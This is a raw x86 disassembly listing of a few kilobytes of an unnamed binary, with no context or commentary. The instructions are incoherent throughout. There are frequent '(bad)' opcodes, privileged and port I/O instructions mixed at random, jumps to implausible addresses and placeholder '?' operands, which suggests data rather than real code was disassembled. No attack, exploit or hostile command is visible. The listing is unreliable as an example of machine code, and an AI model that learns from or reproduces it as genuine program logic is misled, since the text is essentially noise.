  41a407:	xor    BYTE PTR [ebx],cl
  41a409:	jo     0x41a3c8
  41a40b:	sbb    al,0xd7
  41a40d:	push   ebp
  41a40e:	arpl   bp,ax
  41a410:	cmp    al,0xb8
  41a412:	adc    ah,al
  41a414:	jmp    0x41a44a
  41a416:	imul   ecx,DWORD PTR [esi-0x238d4b97],0x7634b684
  41a420:	cs mov ah,0xb2
  41a423:	xor    BYTE PTR cs:[ebx],bh
  41a426:	add    bh,cl
  41a428:	sahf   
  41a429:	fst    DWORD PTR [edx-0x3f29c892]
  41a42f:	cmp    dh,bl
  41a431:	mov    ah,0xbf
  41a433:	mov    ecx,0xba086c46
  41a438:	(bad)  
  41a439:	sahf   
  41a43a:	push   0xffffffa2
  41a43c:	or     DWORD PTR [ebx-0xc],ecx
  41a43f:	outs   dx,DWORD PTR ds:[esi]
  41a440:	jp     0x41a49f
  41a442:	jp     0x41a427
  41a444:	mov    ah,0xfc
  41a446:	pop    ebx
  41a447:	or     bh,BYTE PTR [eax+eiz*4-0x3bded88d]
  41a44e:	jns    0x41a437
  41a450:	in     al,0xe0
  41a452:	inc    ebp
  41a453:	adc    ah,0x8e
  41a456:	pop    ecx
  41a457:	mov    eax,0x316b83fa
  41a45c:	jle    0x41a4d4
  41a45e:	add    al,0xaf
  41a460:	sbb    esi,DWORD PTR [edi+0x4c580e7a]
  41a466:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a467:	rol    esp,0xb4
  41a46a:	inc    eax
  41a46b:	leave  
  41a46c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a46d:	cli    
  41a46e:	pop    esi
  41a46f:	or     BYTE PTR [ebp-0x1b],0x20
  41a473:	pop    ecx
  41a474:	loop   0x41a4da
  41a476:	pop    ss
  41a477:	add    ah,BYTE PTR [edx]
  41a479:	or     BYTE PTR [ebx],dh
  41a47b:	jp     0x41a4b0
  41a47d:	iret   
  41a47e:	fs pop ebx
  41a480:	cs cld 
  41a482:	stc    
  41a483:	mov    eax,0x227ed5a7
  41a488:	mov    dh,0x49
  41a48a:	in     eax,dx
  41a48b:	into   
  41a48c:	and    al,0x18
  41a48e:	inc    edx
  41a48f:	jno    0x41a4bb
  41a491:	push   es
  41a492:	dec    ebp
  41a493:	(bad)  
  41a494:	dec    esi
  41a495:	push   0xffffffdd
  41a497:	adc    bh,ch
  41a499:	bnd jl 0x41a460
  41a49c:	xchg   ebp,eax
  41a49d:	cmp    al,0x80
  41a49f:	nop
  41a4a0:	pop    es
  41a4a1:	test   eax,0x581bb21e
  41a4a6:	cmp    DWORD PTR [edx+0x2e43c489],edi
  41a4ac:	sbb    BYTE PTR [edi],ah
  41a4ae:	les    ebx,FWORD PTR [eax]
  41a4b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4b1:	call   DWORD PTR [edx]
  41a4b3:	lea    edi,[eax-0x6fc58258]
  41a4b9:	cwde   
  41a4ba:	ins    BYTE PTR es:[edi],dx
  41a4bb:	inc    edx
  41a4bc:	repnz inc edx
  41a4be:	out    dx,eax
  41a4bf:	add    DWORD PTR [ecx+0x7232adcc],0xaac7feb0
  41a4c9:	jns    0x41a4cc
  41a4cb:	add    bh,BYTE PTR [eax+0x39f880fc]
  41a4d1:	and    eax,0x7768946e
  41a4d6:	neg    BYTE PTR [edi+0x4d]
  41a4d9:	pusha  
  41a4da:	mov    ?,edi
  41a4dc:	call   0x8fa35384
  41a4e1:	adc    eax,0xd7e52e06
  41a4e6:	mov    ds:0xeee76273,eax
  41a4eb:	fs adc al,0x99
  41a4ee:	cs xor eax,0x152a9ebf
  41a4f4:	pop    esp
  41a4f5:	shr    DWORD PTR [eax],cl
  41a4f7:	mov    eax,0x45347096
  41a4fc:	xchg   edi,eax
  41a4fd:	sub    DWORD PTR [ecx+eiz*1+0x4f],0x81261301
  41a505:	inc    edi
  41a506:	lahf   
  41a507:	push   0x24fd8ba9
  41a50c:	fidiv  WORD PTR [edi]
  41a50e:	out    0x74,al
  41a510:	or     eax,DWORD PTR [ebx-0x27]
  41a513:	rcr    DWORD PTR [edi+ecx*4],1
  41a516:	iret   
  41a517:	or     al,0x7d
  41a519:	mov    edx,0x4eb2fe61
  41a51e:	les    esi,FWORD PTR [edi+edi*1+0x322b2995]
  41a525:	out    dx,al
  41a526:	xor    ebx,edi
  41a528:	mov    ecx,0x11c7aed1
  41a52d:	fwait
  41a52e:	mov    DWORD PTR [ecx-0x5472ba91],0x7b327cb4
  41a538:	mov    dh,0x67
  41a53a:	loopne 0x41a4f6
  41a53c:	(bad)  
  41a53e:	xchg   BYTE PTR [esi+edi*8],bl
  41a541:	sub    eax,0x38c75b5d
  41a546:	mov    dl,dh
  41a548:	add    eax,0x1b0440e5
  41a54d:	fsubrp st(2),st
  41a54f:	pop    edi
  41a550:	push   esi
  41a551:	sub    al,BYTE PTR [esi]
  41a553:	jne    0x41a592
  41a555:	fsub   DWORD PTR [edi]
  41a557:	dec    BYTE PTR [edx-0x271ffe57]
  41a55d:	jae    0x41a52c
  41a55f:	js     0x41a5b9
  41a561:	dec    esp
  41a562:	leave  
  41a563:	mov    eax,ds:0x3a8d2860
  41a568:	xchg   ebx,eax
  41a569:	in     al,dx
  41a56a:	mov    eax,0xc39662e4
  41a56f:	mov    WORD PTR [ecx],cs
  41a571:	mov    eax,DWORD PTR [edi-0x5c]
  41a574:	in     eax,dx
  41a575:	mov    BYTE PTR [ebx],bl
  41a577:	pop    ecx
  41a578:	push   ecx
  41a579:	into   
  41a57a:	test   al,0x1c
  41a57c:	arpl   WORD PTR [ecx+eiz*2],cx
  41a57f:	push   eax
  41a580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a581:	mov    ds,WORD PTR [eax+0x68]
  41a584:	sub    esp,DWORD PTR [ebp-0x67]
  41a587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a588:	mov    ch,0x79
  41a58a:	add    ebp,DWORD PTR [eax]
  41a58c:	je     0x41a53e
  41a58e:	fidivr DWORD PTR [ecx+0x13]
  41a591:	int3   
  41a592:	adc    ecx,DWORD PTR [ecx+0x37]
  41a595:	dec    esp
  41a596:	aad    0xd8
  41a598:	mov    bl,0x70
  41a59a:	mov    ch,0x45
  41a59c:	dec    ecx
  41a59d:	xchg   edx,eax
  41a59e:	lods   eax,DWORD PTR ds:[esi]
  41a59f:	mov    eax,ds:0xebc21e7f
  41a5a4:	and    ebx,DWORD PTR [ebx]
  41a5a6:	(bad)  
  41a5a8:	addr16 leave 
  41a5aa:	stos   DWORD PTR es:[edi],eax
  41a5ab:	das    
  41a5ac:	test   BYTE PTR ds:[edi-0x54],al
  41a5b0:	mov    bh,0x99
  41a5b2:	shl    BYTE PTR [ecx+0x59a70103],cl
  41a5b8:	lds    ecx,FWORD PTR [edi+0x2a]
  41a5bb:	cs scas al,BYTE PTR es:[edi]
  41a5bd:	sahf   
  41a5be:	lea    edi,[edi-0x45f62d89]
  41a5c4:	cmp    DWORD PTR [edi+edi*8-0x15],ecx
  41a5c8:	lods   eax,DWORD PTR ds:[esi]
  41a5c9:	sub    ah,BYTE PTR [ebx+ecx*8+0x55]
  41a5cd:	test   al,0xf1
  41a5cf:	mov    edi,0x897def4
  41a5d4:	ss adc al,0x11
  41a5d7:	jmp    esi
  41a5d9:	push   ss
  41a5da:	push   edi
  41a5db:	xor    ah,BYTE PTR [ebx+0x45]
  41a5de:	or     dl,cl
  41a5e0:	out    dx,al
  41a5e1:	inc    edi
  41a5e2:	retf   
  41a5e3:	in     eax,dx
  41a5e4:	inc    edx
  41a5e5:	pop    eax
  41a5e6:	xchg   edi,eax
  41a5e7:	loop   0x41a5d8
  41a5e9:	repz mov ecx,0x1bdaf634
  41a5ef:	sbb    DWORD PTR [ebx],0xa4f5afc6
  41a5f5:	or     DWORD PTR [esi+edx*1+0x151322b1],esi
  41a5fc:	pop    esp
  41a5fd:	push   edx
  41a5fe:	xchg   edx,eax
  41a5ff:	pop    esi
  41a600:	sbb    ebp,DWORD PTR [eax+0x31]
  41a603:	sahf   
  41a604:	xchg   DWORD PTR [edi-0x4ce167cc],esi
  41a60a:	loope  0x41a689
  41a60c:	ss adc al,0xb5
  41a60f:	fwait
  41a610:	ss aam 0x6a
  41a613:	mov    bh,0xdb
  41a615:	xor    edx,DWORD PTR [edi+esi*1]
  41a618:	mov    bh,0x7f
  41a61b:	or     al,0xa4
  41a61d:	dec    eax
  41a61e:	icebp  
  41a61f:	sbb    eax,0xb3e2e58f
  41a624:	xchg   edi,eax
  41a625:	out    0x5a,al
  41a627:	sbb    eax,DWORD PTR [ebp-0x10]
  41a62a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a62b:	and    eax,0xa9eb73bf
  41a630:	enter  0xfa1d,0x43
  41a634:	push   esp
  41a635:	fs lahf 
  41a637:	mov    ch,0xd2
  41a639:	dec    ebx
  41a63a:	xchg   ecx,eax
  41a63b:	sub    ah,ah
  41a63d:	add    al,0x86
  41a63f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a640:	add    esp,edi
  41a642:	pop    ds
  41a643:	arpl   WORD PTR [edi+0x70],dx
  41a646:	test   eax,0xcb29955c
  41a64b:	imul   edi,DWORD PTR [ebx+0x3d418b8b],0xffffff8e
  41a652:	loop   0x41a609
  41a654:	sub    esi,DWORD PTR [esi+eiz*8]
  41a657:	and    DWORD PTR [ebp-0x65],edx
  41a65a:	neg    DWORD PTR [ecx+0x2f]
  41a65d:	cmp    al,0x89
  41a65f:	push   ds
  41a660:	add    al,0x75
  41a662:	pusha  
  41a663:	fsubr  DWORD PTR [edi]
  41a665:	fdivp  st(7),st
  41a667:	(bad)  
  41a669:	jecxz  0x41a61a
  41a66b:	jl     0x41a66f
  41a66d:	xlat   BYTE PTR ds:[ebx]
  41a66e:	mov    esp,0x31216464
  41a673:	aaa    
  41a674:	pop    esp
  41a675:	adc    DWORD PTR [esi-0x66a3ddc2],edx
  41a67b:	out    0xe9,al
  41a67d:	jge    0x41a6c1
  41a67f:	jecxz  0x41a601
  41a681:	pop    ebx
  41a682:	rep stos BYTE PTR es:[edi],al
  41a684:	cli    
  41a685:	int3   
  41a686:	cmp    ecx,ecx
  41a688:	xor    dh,al
  41a68a:	pop    edx
  41a68b:	scas   al,BYTE PTR es:[edi]
  41a68c:	rcr    dl,0x56
  41a68f:	lods   eax,DWORD PTR ds:[esi]
  41a690:	fs sahf 
  41a692:	sbb    ch,BYTE PTR [eax+0x6d]
  41a695:	(bad)  
  41a696:	into   
  41a697:	ds aaa 
  41a699:	mov    al,BYTE PTR [ebx+0x20f09016]
  41a69f:	jmp    0x41a629
  41a6a1:	push   cs
  41a6a2:	sub    BYTE PTR ds:0x7e9baad4,0xc7
  41a6a9:	fwait
  41a6aa:	jg     0x41a726
  41a6ac:	in     eax,0x1d
  41a6ae:	jecxz  0x41a644
  41a6b0:	cmp    eax,DWORD PTR [ecx]
  41a6b2:	call   0xd86d8c7
  41a6b7:	fst    QWORD PTR [esi+0x5d]
  41a6ba:	xchg   edi,eax
  41a6bb:	into   
  41a6bc:	enter  0xe290,0xc9
  41a6c0:	fldenv [ebx-0x65]
  41a6c3:	mov    edi,0xfdf2ca25
  41a6c8:	repz ret 0x819
  41a6cc:	add    dl,BYTE PTR [edi-0x57]
  41a6cf:	les    edi,FWORD PTR [eax-0x5d3efe1f]
  41a6d5:	or     ecx,esi
  41a6d7:	pop    ss
  41a6d8:	push   cs
  41a6d9:	cwde   
  41a6da:	xlat   BYTE PTR ds:[ebx]
  41a6db:	aaa    
  41a6dc:	push   edi
  41a6dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6de:	push   ebx
  41a6df:	test   eax,0x3fbd5cf5
  41a6e4:	dec    edi
  41a6e5:	cmc    
  41a6e6:	scas   al,BYTE PTR es:[edi]
  41a6e7:	push   ecx
  41a6e8:	(bad)  
  41a6e9:	dec    edx
  41a6ea:	das    
  41a6eb:	icebp  
  41a6ec:	and    DWORD PTR [edx],esi
  41a6ee:	pop    eax
  41a6ef:	js     0x41a723
  41a6f1:	call   0x2aad:0xe8680064
  41a6f8:	mov    ch,0x2b
  41a6fa:	stos   BYTE PTR es:[edi],al
  41a6fb:	aam    0x5c
  41a6fd:	iret   
  41a6fe:	xchg   ecx,eax
  41a6ff:	mov    ch,BYTE PTR [esi]
  41a701:	lods   al,BYTE PTR ds:[esi]
  41a702:	mov    dl,0x29
  41a704:	adc    eax,DWORD PTR [ecx+0x6084cc70]
  41a70a:	mul    eax
  41a70c:	es repnz mov ebp,0x9d07b342
  41a713:	pop    ds
  41a714:	pop    esp
  41a715:	mov    ebp,0xe7a532e5
  41a71a:	mov    cl,BYTE PTR [esi+0x4a258c4f]
  41a720:	jg     0x41a6a5
  41a722:	in     al,dx
  41a723:	fs add edi,0xffffff88
  41a727:	imul   eax,DWORD PTR [ecx+0x20],0x99d76c2b
  41a72e:	sub    eax,0x10f664c3
  41a733:	fist   WORD PTR [ecx-0x40a7793d]
  41a739:	xor    dl,bh
  41a73b:	pusha  
  41a73c:	aas    
  41a73d:	fst    DWORD PTR [edi]
  41a73f:	(bad)  
  41a740:	(bad)  
  41a741:	jmp    FWORD PTR [esi]
  41a743:	push   edi
  41a744:	mov    dl,0xaa
  41a746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a747:	in     eax,0x4e
  41a749:	retf   0xecdc
  41a74c:	(bad)  
  41a74d:	xchg   ecx,eax
  41a74e:	addr16 dec ebp
  41a750:	inc    edx
  41a751:	jnp    0x41a743
  41a753:	mov    ?,WORD PTR ds:0x6bee7e10
  41a759:	jmp    0x41a6f6
  41a75b:	cli    
  41a75c:	cmp    al,0xfb
  41a75e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a75f:	test   esp,ecx
  41a761:	cmp    edi,edx
  41a763:	out    dx,al
  41a764:	jmp    0x2b90bf85
  41a769:	xchg   esi,eax
  41a76a:	in     al,0x78
  41a76c:	add    eax,0x71a3f9e8
  41a771:	cmova  ecx,edx
  41a774:	data16 (bad) 
  41a776:	and    cl,bh
  41a778:	add    ebx,ebx
  41a77a:	mov    dl,dl
  41a77c:	sub    al,0xda
  41a77e:	mov    al,ds:0x4a7ab8aa
  41a783:	xchg   edx,eax
  41a784:	inc    ecx
  41a785:	nop
  41a786:	out    0x80,al
  41a788:	sub    DWORD PTR [ebx+0x13],edx
  41a78b:	cwde   
  41a78c:	jmp    FWORD PTR [esi]
  41a78e:	aaa    
  41a78f:	xchg   BYTE PTR [edi],ah
  41a791:	inc    esp
  41a792:	and    edx,DWORD PTR [edi]
  41a794:	sbb    edi,DWORD PTR [eax+0x9]
  41a797:	pop    edx
  41a798:	repnz dec ebx
  41a79a:	imul   edx,DWORD PTR [edi],0x45
  41a79d:	dec    ebx
  41a79e:	add    eax,0xc9b9694b
  41a7a3:	adc    ebp,ecx
  41a7a5:	rcr    al,0xd0
  41a7a8:	dec    ecx
  41a7a9:	jns    0x41a785
  41a7ab:	scas   al,BYTE PTR es:[edi]
  41a7ac:	test   DWORD PTR [edx-0x31],edi
  41a7af:	push   edx
  41a7b0:	mov    eax,0x20c1a083
  41a7b5:	cmp    BYTE PTR [edi],al
  41a7b7:	and    BYTE PTR [edx],0x11
  41a7ba:	adc    al,0xed
  41a7bc:	jg     0x41a7c9
  41a7be:	(bad)  
  41a7bf:	aad    0x98
  41a7c1:	dec    edi
  41a7c2:	cmp    DWORD PTR [ecx-0x5c6ac610],ebx
  41a7c8:	aam    0xfe
  41a7ca:	and    BYTE PTR [ebp+0x4f],bh
  41a7cd:	cs dec eax
  41a7cf:	inc    edi
  41a7d0:	adc    al,0x46
  41a7d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7d3:	sbb    DWORD PTR [edi+0x348f9a24],esp
  41a7d9:	lds    ebx,FWORD PTR [eax]
  41a7db:	icebp  
  41a7dc:	dec    eax
  41a7dd:	add    al,0xa5
  41a7df:	pop    edx
  41a7e0:	enter  0x64b5,0x9e
  41a7e4:	fs out dx,al
  41a7e6:	outs   dx,BYTE PTR ds:[esi]
  41a7e7:	mov    cl,0x58
  41a7e9:	mov    esp,ebx
  41a7eb:	fcmovnu st,st(7)
  41a7ed:	add    bh,BYTE PTR [ecx]
  41a7ef:	int    0x89
  41a7f1:	inc    esi
  41a7f2:	lahf   
  41a7f3:	daa    
  41a7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a7f5:	push   0xfffffffb
  41a7f7:	cmp    al,0xf5
  41a7f9:	inc    ebp
  41a7fa:	jg     0x41a874
  41a7fc:	or     DWORD PTR [ebx+ebp*8-0x1622f371],0x1a8379ac
  41a807:	jno    0x41a7c5
  41a809:	dec    eax
  41a80a:	sbb    DWORD PTR [ecx+0x1eb8a472],ecx
  41a810:	popf   
  41a811:	rcr    DWORD PTR [ecx-0x261dd236],cl
  41a817:	stos   BYTE PTR es:[edi],al
  41a818:	ins    DWORD PTR es:[edi],dx
  41a819:	stos   BYTE PTR es:[edi],al
  41a81a:	mov    ds:0xb2ed22ef,eax
  41a81f:	inc    edi
  41a820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a821:	mov    dl,0xca
  41a823:	pop    ebp
  41a824:	xchg   ebp,eax
  41a825:	sar    ebp,1
  41a827:	retf   0x2278
  41a82a:	sbb    al,0xd2
  41a82c:	xchg   ch,bl
  41a82e:	cmp    al,bl
  41a830:	or     ebp,DWORD PTR [edx+0x236cc5cb]
  41a836:	imul   esp,edx,0xffffffa3
  41a839:	loopne 0x41a7fa
  41a83b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a83c:	in     eax,0xb5
  41a83e:	add    cl,BYTE PTR [esp+ecx*2+0x54cd8cfd]
  41a845:	and    ecx,DWORD PTR [ebp+0x308f1178]
  41a84b:	sub    DWORD PTR [edx-0xca9a32c],0x4e3ddf02
  41a855:	or     eax,0xb745070b
  41a85a:	adc    DWORD PTR [esi+0x23],0x688d146c
  41a861:	inc    ecx
  41a862:	push   edx
  41a863:	arpl   WORD PTR [ecx+0xc00bed4],si
  41a869:	or     BYTE PTR [ecx],al
  41a86b:	mov    ds:0xa9748d58,al
  41a870:	scas   al,BYTE PTR es:[edi]
  41a871:	pop    esp
  41a872:	push   esp
  41a873:	icebp  
  41a874:	hlt    
  41a875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a876:	fsubr  QWORD PTR [esi]
  41a878:	jnp    0x41a8d4
  41a87a:	push   eax
  41a87b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a87c:	xor    bl,ch
  41a87e:	cld    
  41a87f:	test   al,0x19
  41a881:	mov    eax,0x3628bf1d
  41a886:	test   BYTE PTR [ecx],bl
  41a888:	ret    
  41a889:	pop    esp
  41a88a:	sub    edx,ebx
  41a88c:	pop    edx
  41a88d:	mov    ds:0x69e8dfdf,eax
  41a892:	and    al,0xbc
  41a894:	mov    esp,0x72602d34
  41a899:	mov    BYTE PTR [esi+0x1c],cl
  41a89c:	push   eax
  41a89d:	mov    cl,0x66
  41a89f:	pop    ebx
  41a8a0:	jo     0x41a8ea
  41a8a2:	push   ebp
  41a8a3:	add    esi,edx
  41a8a5:	imul   ebx,DWORD PTR [eax-0x318883d9],0x60
  41a8ac:	repnz or DWORD PTR [esi+0x3f21b710],esp
  41a8b3:	lds    ebp,FWORD PTR [edi]
  41a8b5:	jle    0x41a91c
  41a8b7:	hlt    
  41a8b8:	sbb    BYTE PTR [edx+0x2f],0x3
  41a8bc:	sti    
  41a8bd:	les    edx,FWORD PTR [edi+0x2911440b]
  41a8c3:	sbb    bh,ah
  41a8c5:	add    al,0x9
  41a8c7:	jnp    0x41a8e9
  41a8c9:	fiadd  DWORD PTR [ebx+eiz*2-0x799be0f9]
  41a8d0:	enter  0x8c3c,0xe0
  41a8d4:	neg    DWORD PTR [edx+eiz*4]
  41a8d7:	es ret 
  41a8d9:	pop    ebx
  41a8da:	adc    BYTE PTR [ebp+ebp*2+0x2d42ab4c],cl
  41a8e1:	mov    cl,0x69
  41a8e3:	lock iret 
  41a8e5:	pop    ds
  41a8e6:	mov    ds:0xb337573b,al
  41a8eb:	out    dx,al
  41a8ec:	adc    BYTE PTR [edx+0x44],ah
  41a8ef:	lods   al,BYTE PTR ds:[esi]
  41a8f0:	in     eax,dx
  41a8f1:	pusha  
  41a8f2:	mov    ecx,eax
  41a8f4:	test   eax,0xd5f7ce19
  41a8f9:	dec    ebp
  41a8fa:	sbb    DWORD PTR [ebx],0x31384c56
  41a900:	mov    DWORD PTR [edi-0x7e],eax
  41a903:	test   DWORD PTR [edi-0x64064ea4],0x251fb1a7
  41a90d:	int    0xc9
  41a90f:	stos   BYTE PTR es:[edi],al
  41a910:	lods   al,BYTE PTR ds:[esi]
  41a911:	or     DWORD PTR [ebx+0x21],ebx
  41a914:	push   cs
  41a915:	sbb    dl,al
  41a917:	rol    DWORD PTR [ebp-0x7ad235da],cl
  41a91d:	sti    
  41a91e:	icebp  
  41a91f:	arpl   ax,cx
  41a921:	mov    DWORD PTR [eax-0x304d0342],eax
  41a927:	lods   al,BYTE PTR ds:[esi]
  41a928:	bound  ebx,QWORD PTR [ebp+0x4]
  41a92b:	and    BYTE PTR [esi+edx*1-0x221d32ef],0xc1
  41a933:	add    ecx,ebp
  41a935:	dec    esi
  41a936:	sub    bh,BYTE PTR [edx+0x47]
  41a939:	int    0xcc
  41a93b:	xchg   ecx,eax
  41a93c:	js     0x41a8c9
  41a93e:	add    DWORD PTR [ecx],ebx
  41a940:	ds sub ecx,esi
  41a943:	outs   dx,DWORD PTR ds:[esi]
  41a944:	mov    eax,0xdbc0d894
  41a949:	pop    ds
  41a94a:	mov    al,ds:0x303e7079
  41a94f:	jg     0x41a904
  41a951:	outs   dx,BYTE PTR ds:[esi]
  41a952:	xor    ebx,DWORD PTR [edx]
  41a954:	sahf   
  41a955:	pop    eax
  41a956:	jnp    0x41a9b0
  41a958:	mov    esi,cr4
  41a95b:	push   es
  41a95c:	cwde   
  41a95d:	pop    esp
  41a95e:	retf   0x1892
  41a961:	xor    eax,0x1dbe1ed6
  41a966:	dec    ecx
  41a967:	mov    ecx,esi
  41a969:	ins    DWORD PTR es:[edi],dx
  41a96a:	or     DWORD PTR [esi],edx
  41a96c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a96d:	ins    BYTE PTR es:[edi],dx
  41a96e:	xchg   ebx,eax
  41a96f:	iret   
  41a970:	mov    WORD PTR [edx-0x1c20e2e7],ss
  41a976:	jmp    0x983e1cc8
  41a97b:	xchg   ebp,eax
  41a97c:	inc    ebx
  41a97d:	mov    WORD PTR [ebp+0x118f58ff],?
  41a983:	aas    
  41a984:	into   
  41a985:	pusha  
  41a986:	adc    DWORD PTR ds:0xdd3d95e7,0xffffffec
  41a98d:	and    ch,bl
  41a98f:	jae    0x41a918
  41a991:	stos   DWORD PTR es:[edi],eax
  41a992:	int3   
  41a993:	pop    ss
  41a994:	(bad)  
  41a995:	jmp    0x1b41:0x575ee45f
  41a99c:	mov    bh,0x91
  41a99e:	rcl    DWORD PTR [ebx-0x68],0x3b
  41a9a2:	shl    BYTE PTR [ebx+0x10427908],1
  41a9a8:	inc    edi
  41a9a9:	jmp    0x87d56a9d
  41a9ae:	enter  0x8122,0x5e
  41a9b2:	pop    ecx
  41a9b3:	fdiv   DWORD PTR [edx]
  41a9b5:	push   ecx
  41a9b6:	das    
  41a9b7:	jecxz  0x41a9e4
  41a9b9:	dec    DWORD PTR [eax+0x6bd84c9c]
  41a9bf:	outs   dx,DWORD PTR ds:[esi]
  41a9c0:	call   0xa2a3:0xd63c9a0
  41a9c7:	adc    al,0x8c
  41a9c9:	pop    edx
  41a9ca:	or     ecx,ecx
  41a9cc:	or     al,0x67
  41a9ce:	cld    
  41a9cf:	push   0x23
  41a9d1:	inc    ecx
  41a9d2:	loopne 0x41a9a7
  41a9d4:	pop    edi
  41a9d5:	imul   ebx,DWORD PTR [edx+eax*4+0xe],0xa30ad1bd
  41a9dd:	xchg   ecx,eax
  41a9de:	mov    ch,0x3b
  41a9e0:	push   eax
  41a9e1:	imul   ecx,DWORD PTR [ebp+0x1eaebc27],0xce228052
  41a9eb:	push   edi
  41a9ec:	cmp    BYTE PTR [ebx],bl
  41a9ee:	ror    DWORD PTR [ecx+esi*8],0xa5
  41a9f2:	add    al,0xe3
  41a9f4:	sahf   
  41a9f5:	bound  edx,QWORD PTR [ebx-0x6]
  41a9f8:	sbb    esi,DWORD PTR [esi-0x32fc5bdb]
  41a9fe:	enter  0x5e10,0x1e
  41aa02:	dec    esp
  41aa03:	sub    eax,0x6131bdfe
  41aa08:	retf   0x1811
  41aa0b:	mov    al,0x34
  41aa0d:	or     ebx,DWORD PTR ds:0xa1dd93ec
  41aa13:	div    BYTE PTR [ecx+0x7c]
  41aa16:	call   0xd0e0d494
  41aa1b:	inc    eax
  41aa1c:	or     ebx,eax
  41aa1e:	lds    ebp,FWORD PTR [edx+0x14aac230]
  41aa24:	mov    ch,0x16
  41aa26:	pop    ecx
  41aa27:	cmp    eax,0xf7ad4c6
  41aa2c:	bound  eax,QWORD PTR [eax+0x2c]
  41aa2f:	mov    WORD PTR [eax+0x7abf9aaf],ss
  41aa35:	aas    
  41aa36:	jmp    0x41aa93
  41aa38:	ins    BYTE PTR es:[edi],dx
  41aa39:	xor    eax,0xe806eece
  41aa3e:	data16 mov BYTE PTR [edx],ch
  41aa41:	lds    eax,FWORD PTR ds:0x33efc398
  41aa47:	push   cs
  41aa48:	lods   al,BYTE PTR ds:[esi]
  41aa49:	or     eax,0xe7ebe570
  41aa4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa4f:	test   eax,0x9696f7fa
  41aa54:	mov    dl,0xf5
  41aa56:	fs out dx,al
  41aa58:	mov    al,ds:0x75383d90
  41aa5d:	pop    eax
  41aa5e:	hlt    
  41aa5f:	(bad)  
  41aa60:	in     al,dx
  41aa61:	xchg   esi,eax
  41aa62:	fcom   st(2)
  41aa64:	sbb    bh,al
  41aa66:	mov    edi,gs
  41aa68:	pandn  mm5,QWORD PTR [edi+0x1793b0cd]
  41aa6f:	sbb    ebx,DWORD PTR [ecx]
  41aa71:	bound  esp,QWORD PTR [esi]
  41aa73:	push   ebx
  41aa74:	xor    BYTE PTR [eax-0x1e4f541d],bl
  41aa7a:	leave  
  41aa7b:	shl    ecx,cl
  41aa7d:	(bad)  
  41aa7e:	mov    dh,0x66
  41aa80:	inc    edx
  41aa81:	inc    esp
  41aa82:	mov    dh,0xa5
  41aa84:	add    BYTE PTR [esi-0x30],bl
  41aa87:	inc    ecx
  41aa88:	jae    0x41aad7
  41aa8a:	mov    BYTE PTR [ecx],bh
  41aa8c:	scas   eax,DWORD PTR es:[edi]
  41aa8d:	popf   
  41aa8e:	and    DWORD PTR [edi+eiz*8-0x1b],esp
  41aa92:	ror    DWORD PTR [edx],0x22
  41aa95:	add    cl,BYTE PTR [edx-0x49]
  41aa98:	dec    ecx
  41aa99:	lahf   
  41aa9a:	mov    es,WORD PTR [ecx+0xbf57cfc]
  41aaa0:	mov    eax,ds:0x62fea007
  41aaa5:	ret    
  41aaa6:	sbb    BYTE PTR [ebx-0xc906ef2],dl
  41aaac:	xor    BYTE PTR [eax-0x357a6bce],al
  41aab2:	pop    ds
  41aab3:	pop    edx
  41aab4:	mov    ds:0x4e549a79,eax
  41aab9:	shl    DWORD PTR [eax-0x1247c7c],1
  41aabf:	mov    bl,0x8f
  41aac1:	dec    esi
  41aac2:	int3   
  41aac3:	mov    dl,0x34
  41aac5:	mov    esi,0xf80e851a
  41aaca:	das    
  41aacb:	add    al,0x68
  41aacd:	mov    ebp,0x5404855a
  41aad2:	leave  
  41aad3:	out    0x28,al
  41aad5:	xchg   ebp,eax
  41aad6:	jae    0x41aaff
  41aad8:	out    dx,al
  41aad9:	xchg   ebx,eax
  41aada:	push   edx
  41aadb:	cmp    bh,BYTE PTR [eax+ecx*1-0x1610ebe6]
  41aae2:	xchg   DWORD PTR [eax+ebx*2],eax
  41aae5:	jbe    0x41ab40
  41aae7:	xor    cl,BYTE PTR [esi]
  41aae9:	adc    eax,0x56e6cc0e
  41aaee:	mov    ebx,0x80f6e44c
  41aaf3:	mov    ecx,0x5b03b969
  41aaf8:	push   edi
  41aaf9:	adc    eax,0x95acd665
  41aafe:	into   
  41aaff:	fs (bad) 
  41ab01:	push   esi
  41ab02:	push   cs
  41ab03:	pushf  
  41ab04:	mov    al,0x70
  41ab06:	pop    ecx
  41ab07:	jp     0x41ab0f
  41ab09:	pop    ds
  41ab0a:	adc    esi,edi
  41ab0c:	jb     0x41ab26
  41ab0e:	leave  
  41ab0f:	add    BYTE PTR [ecx+0x173dc356],ah
  41ab15:	idiv   BYTE PTR [esi-0x68]
  41ab18:	stc    
  41ab19:	dec    eax
  41ab1a:	pop    ecx
  41ab1b:	adc    esi,DWORD PTR [ecx+edi*1+0x19881bce]
  41ab22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab23:	jmp    0x25e299fe
  41ab28:	mov    ?,ebx
  41ab2a:	mov    ds:0x62a789b4,al
  41ab2f:	xor    BYTE PTR [edi+0x6efec77a],bl
  41ab35:	mov    BYTE PTR [eax],ch
  41ab37:	jecxz  0x41abb1
  41ab39:	popf   
  41ab3a:	int3   
  41ab3b:	push   ds
  41ab3c:	jmp    FWORD PTR [edi-0x7b2f4280]
  41ab42:	mov    ebx,0x10902b38
  41ab47:	mov    eax,ds:0x3efac334
  41ab4c:	mov    WORD PTR [ecx+edx*2],?
